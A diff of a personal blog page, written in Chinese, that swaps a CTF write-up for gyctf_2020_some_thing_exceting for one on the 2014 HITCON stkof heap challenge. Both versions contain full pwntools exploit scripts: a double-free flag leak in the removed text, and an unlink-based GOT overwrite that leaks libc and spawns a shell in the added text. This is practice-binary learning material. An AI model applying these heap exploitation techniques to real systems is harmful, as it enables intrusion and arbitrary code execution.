@@ -165,7 +165,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                gyctf_2020_some_thing_exceting
+                                ctfwiki-unlink—2014 HITCON stkof
                             </h1>
                             
                                 <!--en-->
@@ -175,13 +175,22 @@
                                         lemon的自留地～
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2020-09-03</a>
+                                Date: <a href="#">2020-09-06</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">4.3
+                                    href="#">4.2
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">989</a></span>
+                                    <span class="post-words">words:<a href="#">785</a></span>
                                     
+                                        <span class="post-category">
+                                Category:
+                                
+                                <a href="https://l3mon629.github.io/tag/tc2bM4krw/">heap</a>
+                                
+                                <a href="https://l3mon629.github.io/tag/mizqxcXow6/">unlink</a>
+                                
+                            </span>
+                                        
                                             Views:
                                             <span data-hk-page="current"> - </span>
                                             
@@ -190,121 +199,199 @@
                         </header>
                         
                         <div class="post-content">
-                            <p>第一次尝试了边做题边写wp，感觉还挺好，因为这样可以使自己思路更开阔，很不错<br>
-这个题自己没做出来<br>
-原因：ptmalloc管理机制还是不熟悉，没有想起来double free的利用条件（脑子抽了，不知道当时想的什么</p>
-<h2 id="逆向和解题中的思路">逆向和解题中的思路</h2>
-<p>main函数<br>
-<img src="https://l3mon629.github.io/post-images/1599114217473.png" alt="" loading="lazy"><br>
-r_start函数<br>
-<img src="https://l3mon629.github.io/post-images/1599114232933.png" alt="" loading="lazy"><br>
-可以发现这个函数要求在根目录下有一个flag文件，要不然就exit了，所以本地做题的时候要创建一下<br>
-然后还可以发现这个bss段中有个变量貌似很可疑，后期关注下，看看能不能伪造chunk啥的<br>
-add函数<br>
-<img src="https://l3mon629.github.io/post-images/1599114370049.png" alt="" loading="lazy"><br>
-这个程序没有edit功能<br>
-<img src="https://l3mon629.github.io/post-images/1599114389972.png" alt="" loading="lazy"><br>
-delete  初步分析是有UAF洞<br>
-<img src="https://l3mon629.github.io/post-images/1599114399536.png" alt="" loading="lazy"><br>
-show<br>
-<img src="https://l3mon629.github.io/post-images/1599114406507.png" alt="" loading="lazy"></p>
-<p>我们直接新建两个堆块，看一下内存分布是什么样子的</p>
-<pre><code>from pwn import *
+                            <p>通过这个题目再来学习下unlink</p>
+<h2 id="逆向">逆向</h2>
+<p>main函数，一样是个菜单题，但是比较坑的是没给菜单，只能靠用户来逆向出其功能</p>
+<pre><code class="language-c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  int index; // eax
+  signed int v5; // [rsp+Ch] [rbp-74h]
+  char nptr; // [rsp+10h] [rbp-70h]
+  unsigned __int64 v7; // [rsp+78h] [rbp-8h]
 
-local = 1
-
-if local == 1:
-    p = process('./gyctf_2020_some_thing_exceting')
-else:
-    p = remote('node3.buuoj.cn',27898)
-
-def add(basize,bacontent,nasize,nacontent):
-    p.sendlineafter('&gt; Now please tell me what you want to do :','1')
-    p.sendlineafter('&gt; ba\'s length :',str(basize))
-    p.sendafter('&gt; ba :',bacontent)
-    p.sendlineafter('&gt; na\'s length :',str(nasize))
-    p.sendafter('&gt; na :',nacontent)
-
-def delete(index):
-    p.sendlineafter('&gt; Now please tell me what you want to do :', '3')
-    p.sendlineafter('&gt; Banana ID :',index)
-
-def show(index):
-    p.sendlineafter('&gt; Now please tell me what you want to do :', '4')
-    p.sendlineafter('&gt; Banana ID : &gt; SCP project ID :',index)
-
-add(0x20,'AAAAAAAA',0x30,'BBBBBBBB')
-add(0x10,'aaaaaaaa',0x50,'bbbbbbbb')
-
-pause()
+  v7 = __readfsqword(0x28u);
+  alarm(0x78u);
+  while ( fgets(&amp;nptr, 10, stdin) )
+  {
+    index = atoi(&amp;nptr);
+    if ( index == 2 )
+    {
+      v5 = sub_4009E8();
+      goto LABEL_14;
+    }
+    if ( index &gt; 2 )
+    {
+      if ( index == 3 )
+      {
+        v5 = sub_400B07();
+        goto LABEL_14;
+      }
+      if ( index == 4 )
+      {
+        v5 = sub_400BA9();
+        goto LABEL_14;
+      }
+    }
+    else if ( index == 1 )
+    {
+      v5 = sub_400936();
+      goto LABEL_14;
+    }
+    v5 = -1;
+LABEL_14:
+    if ( v5 )
+      puts(&quot;FAIL&quot;);
+    else
+      puts(&quot;OK&quot;);
+    fflush(stdout);
+  }
+  return 0LL;
+}
 </code></pre>
-<p>看一下chunk分布<br>
-<img src="https://l3mon629.github.io/post-images/1599114596685.png" alt="" loading="lazy"><br>
-可以初步判定，绿色框框框起来的chunk是管理后面两个ba和na的chunk<br>
-但是前面两个非常大的chunk暂时就不知道是用来做什么的了<br>
-分布很清晰<br>
-<img src="https://l3mon629.github.io/post-images/1599114717376.png" alt="" loading="lazy"></p>
-<p>刚刚发现，flag被存到了bss的一个数组里面，见r_start函数<br>
-而且bss段的分布很有意思</p>
-<pre><code>heap[]
-byte_6020A0 (96)
-s[] (flag)
+<p>add堆块功能：<br>
+其中heaparray在0x602140处</p>
+<pre><code class="language-c">signed __int64 sub_400936()
+{
+  __int64 size; // [rsp+0h] [rbp-80h]
+  char *mem_ptr; // [rsp+8h] [rbp-78h]
+  char s; // [rsp+10h] [rbp-70h]
+  unsigned __int64 v4; // [rsp+78h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  fgets(&amp;s, 16, stdin);
+  size = atoll(&amp;s);
+  mem_ptr = (char *)malloc(size);
+  if ( !mem_ptr )
+    return 0xFFFFFFFFLL;
+  ::s[++dword_602100] = mem_ptr;
+  printf(&quot;%d\n&quot;, (unsigned int)dword_602100, size);
+  return 0LL;
+}
 </code></pre>
-<p>这个结构后续肯定可以利用</p>
-<p>可以看到，free后的数据区域已经被清空<br>
-<img src="https://l3mon629.github.io/post-images/1599115130406.png" alt="" loading="lazy"></p>
-<p>我现在的思路是既然程序本身好像没有漏洞，那么肯定不能向拿shell的思路去进行了<br>
-那我们不妨就考虑信息泄漏这个途径，我们可不可以利用double free呢？尝试改写fd指针到byte_6020A0的位置处，然后show打印内容，因为bss段那样的内存分布，一个可以泄漏出flag，本地调试一下<br>
-实验一下发现不可取，因为free后将内容清空了<br>
-那么还有一个思路是因为我们有堆管理指针，那么我们可不可以改写指针到bss段呢？再度尝试一下<br>
-这种思路也失败了，因为发现无法进行溢出，连空字节都无法溢出<br>
-思路三：或许之前大chunk里面有可以利用的点，我们不妨看看</p>
-<p>好吧，并没有发现什么玄机，我准备看wp了:(<br>
-开幕雷击，发现wp利用的是double free，但是在第一个思路里我失败了，本地double free会报错？<br>
-oh no 我傻了，double free的利用条件是前后free的两个chunksize要相同，这样在bin里面才会连接起来，cao，我是sb<br>
-这样岂不是简单很多了？？淦，本来可以自己出的，算了，反正没看exp，自己写exp好了<br>
-<img src="https://l3mon629.github.io/post-images/1599116668687.png" alt="" loading="lazy"><br>
-可以看到已经形成闭环了，至于为啥选0x60，是因为bss段上那个数值是96<br>
-<img src="https://l3mon629.github.io/post-images/1599116866012.png" alt="" loading="lazy"><br>
-已经伪造成功了</p>
+<p>free：<br>
+no UAF</p>
+<pre><code class="language-c">signed __int64 sub_400B07()
+{
+  unsigned int v1; // [rsp+Ch] [rbp-74h]
+  char s; // [rsp+10h] [rbp-70h]
+  unsigned __int64 v3; // [rsp+78h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  fgets(&amp;s, 16, stdin);
+  v1 = atol(&amp;s);
+  if ( v1 &gt; 0x100000 )
+    return 0xFFFFFFFFLL;
+  if ( !::s[v1] )
+    return 0xFFFFFFFFLL;
+  free(::s[v1]);
+  ::s[v1] = 0LL;
+  return 0LL;
+}
+</code></pre>
+<p>edit:可以任意修改堆块size，造成任意堆溢出</p>
+<pre><code class="language-c">signed __int64 sub_4009E8()
+{
+  signed __int64 result; // rax
+  int i; // eax
+  unsigned int index; // [rsp+8h] [rbp-88h]
+  __int64 size; // [rsp+10h] [rbp-80h]
+  char *ptr; // [rsp+18h] [rbp-78h]
+  char s; // [rsp+20h] [rbp-70h]
+  unsigned __int64 v6; // [rsp+88h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  fgets(&amp;s, 16, stdin);
+  index = atol(&amp;s);
+  if ( index &gt; 0x100000 )
+    return 0xFFFFFFFFLL;
+  if ( !::s[index] )
+    return 0xFFFFFFFFLL;
+  fgets(&amp;s, 16, stdin);
+  size = atoll(&amp;s);
+  ptr = ::s[index];
+  for ( i = fread(ptr, 1uLL, size, stdin); i &gt; 0; i = fread(ptr, 1uLL, size, stdin) )
+  {
+    ptr += i;
+    size -= i;
+  }
+  if ( size )
+    result = 0xFFFFFFFFLL;
+  else
+    result = 0LL;
+  return result;
+}
+</code></pre>
+<h2 id="io-缓冲区问题分析">IO 缓冲区问题分析</h2>
+<p>值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。具体如下，可以进行调试查看<br>
+初次调用 fgets 时，malloc 会分配缓冲区 1024 大小。</p>
+<p>别管我说的啥，调试就完了</p>
 <h2 id="exp">exp</h2>
+<p>思路：利用unlink修改heaparray[0][1][2]，看exp吧</p>
 <pre><code class="language-python">from pwn import *
 
-#context.log_level = 'debug'
-local = 0
+p = process('./stkof')
+elf = ELF('./stkof')
+libc = ELF('./libc.so.6')
 
-if local == 1:
-    p = process('./gyctf_2020_some_thing_exceting')
-else:
-    p = remote('node3.buuoj.cn',27898)
+def add(size):
+	p.sendline('1')
+	p.sendline(str(size))
 
-def add(basize,bacontent,nasize,nacontent):
-    p.sendlineafter('&gt; Now please tell me what you want to do :','1')
-    p.sendlineafter('&gt; ba\'s length :',str(basize))
-    p.sendafter('&gt; ba :',bacontent)
-    p.sendlineafter('&gt; na\'s length :',str(nasize))
-    p.sendafter('&gt; na :',nacontent)
+def edit(index,size,content):
+	p.sendline('2')
+	p.sendline(str(index))
+	p.sendline(str(size))
+	p.send(content)
 
 def delete(index):
-    p.sendlineafter('&gt; Now please tell me what you want to do :', '3')
-    p.sendlineafter('&gt; Banana ID :',index)
+	p.sendline('3')
+	p.sendline(str(index))
 
-def show(index):
-    p.sendlineafter('&gt; Now please tell me what you want to do :', '4')
-    p.sendlineafter('&gt; Banana ID : &gt; SCP project ID :',index)
+add(0x10)	#chunk1：对抗缓冲区
+add(0x30)	#chunk2
+add(0x80)	#chunk3
+add(0x10)	#chunk4
 
-add(0x30,'AAAAAAAA',0x50,'BBBBBBBB')    #chunk0
-add(0x30,'aaaaaaaa',0x50,'bbbbbbbb')    #chunk1
+ptr = 0x602140
+fd = ptr + 0x10 - 0x18 
+bk = ptr + 0x10 - 0x10
 
-delete('0')
-delete('1')
-delete('0')
-bss_6020A0 = 0x6020A0 - 0x8
-add(0x50,p64(bss_6020A0),0x50,'A')   #chunk2
-add(0x50,'B',0x50,'C')     #chunk3
+fake_chunk = p64(0)
+fake_chunk += p64(0x31)
+fake_chunk += p64(fd)
+fake_chunk += p64(bk)
+fake_chunk += p64(0) * 2
+fake_chunk += p64(0x30)
+fake_chunk += p64(0x90)
 
-show('3')
-print(p.recv())
+edit(2,len(fake_chunk),fake_chunk)
+delete(3)
+
+print(&quot;现在修改heaparray[0][1][2] 分别为free，puts和atoi&quot;)
+payload = p64(0) 
+payload += p64(elf.got['free'])
+payload += p64(elf.got['puts'])
+payload += p64(elf.got['atoi'])
+edit(2,len(payload),payload)
+
+print(&quot;现在修改free的值为puts，然后free(1),就是puts(1)，即输出puts的真实地址&quot;)
+payload = p64(elf.plt['puts'])
+edit(0,8,payload)
+
+delete(1)
+
+#context.log_level = 'debug'
+puts_addr = u64(p.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8,b'\x00'))
+print(&quot;puts addr ----&gt; &quot; + hex(puts_addr))
+print(&quot;经过调试算出来相对差值为0x67860,不知道为什么最近libc老不准&quot;)
+libc_base = puts_addr - 0x67860
+print(&quot;libc  ---&gt;  &quot; + hex(libc_base))
+
+system_addr = libc_base + 0x3f550
+paylaod = p64(system_addr)
+edit(2,8,paylaod)
+p.sendline(&quot;sh&quot;)
+
 p.interactive()
 </code></pre>
 
@@ -314,7 +401,8 @@ p.interactive()
                                 <ul class="markdownIt-TOC">
 <li>
 <ul>
-<li><a href="#%E9%80%86%E5%90%91%E5%92%8C%E8%A7%A3%E9%A2%98%E4%B8%AD%E7%9A%84%E6%80%9D%E8%B7%AF">逆向和解题中的思路</a></li>
+<li><a href="#%E9%80%86%E5%90%91">逆向</a></li>
+<li><a href="#io-%E7%BC%93%E5%86%B2%E5%8C%BA%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90">IO 缓冲区问题分析</a></li>
 <li><a href="#exp">exp</a></li>
 </ul>
 </li>
@@ -333,7 +421,7 @@ p.interactive()
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://l3mon629.github.io/post/gyctf_2020_some_thing_exceting/">https://l3mon629.github.io/post/gyctf_2020_some_thing_exceting/</a></span>
+                                                <span><a href="https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/">https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -348,9 +436,9 @@ p.interactive()
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/gyctf_2020_some_thing_exceting/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/gyctf_2020_some_thing_exceting/&sharesource=qzone&title=gyctf_2020_some_thing_exceting&pics=https://l3mon629.github.io/images/avatar.png?v=1599364076800&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/gyctf_2020_some_thing_exceting/&sharesource=weibo&title=gyctf_2020_some_thing_exceting + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1599364076800 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/&sharesource=qzone&title=ctfwiki-unlink—2014 HITCON stkof&pics=https://l3mon629.github.io/images/avatar.png?v=1599364076800&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/&sharesource=weibo&title=ctfwiki-unlink—2014 HITCON stkof + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1599364076800 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -359,6 +447,16 @@ p.interactive()
                                                                         <span>Tag(s):</span>
                                                                         <span class="tag ">
                         
+                        
+                        <a href="https://l3mon629.github.io/tag/tc2bM4krw/">#
+                                                heap
+                                                    </a>
+                                                    
+                        <a href="https://l3mon629.github.io/tag/mizqxcXow6/">#
+                                                unlink
+                                                    </a>
+                                                    
+                                                        
                                                             </span>
                                                                     </div>
                                                                     <div>
@@ -371,13 +469,9 @@ p.interactive()
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/">
-                                                                                            unlink利用—hitcontraining_unlink
-                                                                                        </a>
-                                                                                        
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/ret2csu-suo-duan-payload/">
-                                                                                                    ret2csu—缩短payload
+                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/">
+                                                                                                    unlink利用—hitcontraining_unlink
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
